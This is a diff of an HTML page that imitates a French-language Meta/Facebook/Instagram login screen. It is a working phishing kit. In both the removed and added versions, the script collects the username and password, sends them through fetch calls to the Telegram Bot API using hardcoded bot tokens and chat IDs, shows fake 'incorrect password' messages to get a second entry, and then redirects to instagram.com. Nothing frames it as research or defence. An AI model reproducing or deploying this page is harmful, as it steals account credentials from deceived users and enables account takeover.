@@ -1,310 +1,128 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion - Facebook</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        
-        body {
-            background-color: #f0f2f5;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .language-selector {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 14px;
-            color: #1c1e21;
-        }
-        
-        .language-selector span {
-            font-weight: bold;
-        }
-        
-        .login-container {
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        .login-title {
-            font-size: 18px;
-            color: #1c1e21;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .input-field {
-            margin-bottom: 15px;
-        }
-        
-        .input-field input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-            outline: none;
-        }
-        
-        .input-field input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        
-        .login-button {
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 12px;
-            width: 100%;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-        
-        .login-button:hover {
-            background-color: #166fe5;
-        }
-        
-        .forgot-password {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .forgot-password a {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-        
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        
-        .create-account {
-            text-align: center;
-        }
-        
-        .create-account-button {
-            background-color: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 16px;
-            font-weight: bold;
-            padding: 12px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        
-        .create-account-button:hover {
-            background-color: #36a420;
-        }
-        
-        .meta-footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #1c1e21;
-        }
-        
-        .meta-footer span {
-            font-weight: bold;
-        }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.9);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        
-        .loading-text {
-            font-size: 16px;
-            color: #1c1e21;
-        }
-        
-        .error-message {
-            color: #ff4d4f;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 15px;
-            display: none;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Se connecter</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #fff;
+      text-align: center;
+      padding: 50px 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+    }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+      margin: 40px auto;
+      background-color: #eee;
+      border-radius: 20px;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .btn-primary {
+      background-color: #0095f6;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn-secondary {
+      background-color: transparent;
+      border: 1px solid #0095f6;
+      color: #0095f6;
+      padding: 12px;
+      border-radius: 25px;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+
+    .meta-logo {
+      margin-top: 30px;
+      font-size: 14px;
+      color: gray;
+    }
+  </style>
 </head>
+
 <body>
-    <div class="language-selector">
-        Français (France) <span>✔</span>
+  <div class="container">
+    <div class="logo" id="logo-placeholder"></div>
+    <form id="login-form">
+      <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit" class="btn-primary">Se connecter</button>
+    </form>
+    <p id="message" style="margin-top: 20px;"></p>
+    <p><a href="#">Mot de passe oublié ?</a></p>
+    <button class="btn-secondary">Créer un compte</button>
+    <div class="meta-logo">© Meta
     </div>
-    
-    <div class="login-container">
-        <h1 class="login-title">Se connecter à Facebook</h1>
-        
-        <form id="loginForm">
-            <div class="input-field">
-                <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-            </div>
-            
-            <div class="input-field">
-                <input type="password" id="password" placeholder="Mot de passe" required>
-            </div>
-            
-            <div class="error-message" id="errorMessage">
-                Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.
-            </div>
-            
-            <button type="submit" class="login-button">Se connecter</button>
-            
-            <div class="forgot-password">
-                <a href="#">Mot de passe oublié ?</a>
-            </div>
-            
-            <div class="divider"></div>
-            
-            <div class="create-account">
-                <button type="button" class="create-account-button">Créer un compte</button>
-            </div>
-        </form>
-    </div>
-    
-    <div class="meta-footer">
-        <span>✔</span> Meta
-    </div>
-    
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Connexion en cours...</div>
-    </div>
-    
-    <script>
-        // Form submission
-        const loginForm = document.getElementById('loginForm');
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const errorMessage = document.getElementById('errorMessage');
-        let attemptCount = 0;
-        
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            // Show loading overlay
-            loadingOverlay.style.display = 'flex';
-            
-            // First attempt
-            if (attemptCount === 0) {
-                setTimeout(function() {
-                    loadingOverlay.style.display = 'none';
-                    errorMessage.style.display = 'block';
-                    attemptCount++;
-                }, 3000);
-            } 
-            // Second attempt
-            else if (attemptCount === 1) {
-                setTimeout(function() {
-                    loadingOverlay.style.display = 'none';
-                    errorMessage.style.display = 'block';
-                    
-                    // Send data to Telegram bots
-                    sendToTelegram(username, password);
-                    
-                    // Redirect to Instagram after 2 seconds
-                    setTimeout(function() {
-                        window.location.href = "https://www.instagram.com";
-                    }, 2000);
-                }, 3000);
-            }
+  </div>
+
+  <script>
+    const form = document.getElementById("login-form");
+    const message = document.getElementById("message");
+
+    let attempt = 0;
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const bots = [
+        { token: "7092124874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "81764736" },
+        { token: "7159316957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ", chatId: "780712584" }
+      ];
+
+      const text = `Tentative ${attempt + 1}\nNom d'utilisateur: ${username}\nMot de passe: ${password}`;
+
+      for (const bot of bots) {
+        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: text
+          })
         });
-        
-        // Function to send data to Telegram
-        function sendToTelegram(username, password) {
-            const botTokens = [
-                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
-                '7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ'
-            ];
-            const chatId = '780712584';
-            
-            const message = `Nouvelle tentative de connexion Facebook:
-Nom d'utilisateur/e-mail: ${username}
-Mot de passe: ${password}
-Langue: Français (France)
-User Agent: ${navigator.userAgent}
-Heure: ${new Date().toLocaleString('fr-FR')}`;
-            
-            // Send to both bots
-            botTokens.forEach(token => {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                }).catch(error => console.error('Erreur lors de l\'envoi à Telegram:', error));
-            });
+      }
+
+      message.textContent = "Chargement...";
+
+      setTimeout(() => {
+        attempt++;
+        if (attempt < 2) {
+          message.textContent = "Informations incorrectes. Veuillez réessayer.";
+        } else {
+          window.location.href = "https://www.instagram.com";
         }
-        
-        // Create account button click
-        document.querySelector('.create-account-button').addEventListener('click', function() {
-            alert('Création de compte non disponible pour le moment.');
-        });
-        
-        // Forgot password link click
-        document.querySelector('.forgot-password a').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Réinitialisation du mot de passe non disponible pour le moment.');
-        });
-    </script>
+      }, 4000);
+    });
+  </script>
 </body>
+
 </html>
